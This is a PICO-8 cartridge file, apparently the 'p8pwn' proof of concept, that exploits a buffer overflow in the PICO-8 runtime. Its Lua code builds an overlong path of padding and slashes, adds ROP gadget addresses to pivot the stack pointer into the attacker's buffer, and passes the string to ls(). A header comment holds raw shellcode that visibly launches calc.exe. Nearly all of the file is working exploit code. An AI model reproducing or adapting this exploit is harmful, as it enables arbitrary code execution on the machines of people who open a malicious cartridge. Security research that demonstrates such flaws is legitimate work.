pico-8 cartridge // http://www.pico-8.com
version 42
__lua__
-- s¡lŠFµ9ÇE–l›>•ls¡lÿïÿ9ÇE–lF ”ls¡loª9ÇE–lĞ"šls¡lÿoª9ÇE–lp”lZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZs¡lrnª9ÇE–lzq”l1ÀPh.exehcalc‰ãƒì‰$¸ÿÿÿÿ5¿B®ÿÿĞÌ

-- p8pwn
-- github.com/joshiemoore/p8pwn

-- no string.rep in p8 lua :(
function srep(c, n)
  if n < 1 then return "" end
  r = ""
  for _ = 1, n do r = r..c end
  return r
end


-- padding
pwn = ""
for i = 1, 4 do
  pwn = pwn..srep("\x41", 254)
  pwn = pwn.."/"
end
pwn = pwn..srep("\x41", 30)
pwn = pwn.."/"

-- rop stage 1
-- teleport esp to our buffer
-- pop esp ; ret
pwn = pwn.."\xf9\x73\x94\x6c"
pwn = pwn.."\x01\x91\x55\x00"

-- just listin' files, officer
ls(pwn)
